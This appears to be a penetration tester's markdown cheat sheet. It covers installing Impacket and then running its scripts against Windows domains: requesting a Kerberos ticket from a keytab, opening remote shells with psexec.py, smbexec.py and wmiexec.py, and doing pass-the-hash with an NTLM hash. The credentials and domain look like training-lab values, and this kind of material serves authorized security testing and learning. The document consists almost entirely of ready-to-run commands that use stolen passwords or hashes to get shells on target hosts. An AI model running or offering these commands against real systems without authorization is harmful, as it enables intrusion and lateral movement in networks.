
# Python venv quick launch

```
source ~/impacket/venv/bin/activate
```

# Python venv Install (skip if done already):
```
git clone https://github.com/fortra/impacket.git ~/impacket && cd ~/impacket
```

```
python3 -m venv venv && source venv/bin/activate && pip install .
```



## Usage (Start here after initial install):
```
source ~/impacket/venv/bin/activate
```

```
python3 ~/impacket/examples/getTGT.py -k -no-pass 'COMPLYEDGE.COM/WEB05$' -keytab krb5.keytab
```


#### Shell with psexec.py
When we have valid credentials, we can simply login to target.
```python
python3 psexec.py marvel.local/fcastle:Password1@$TARGET
```

#### Passing the hash
When we have username and hash, we can login to target.
```python
python3 psexec.py marvel.local/fcastle@192.168.111.138 -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b
```

#### Shell with smbexec.py
When we have valid credentials, we can simply login to target.
```python
smbexec.py marvel.local/fcastle:Password1@$TARGET
```

#### Passing the hash
When we have username and hash, we can login to target.
```python
smbexec.py marvel.local/fcastle@$TARGET -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b
```

#### Shell with wmi.py
When we have valid credentials, we can simply login to target.
```python
wmiexec.py marvel.local/fcastle:Password1@$TARGET
```
#### Passing the hash
When we have username and hash, we can login to target.
```python
wmiexec.py marvel.local/fcastle@$TARGET -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b
```

















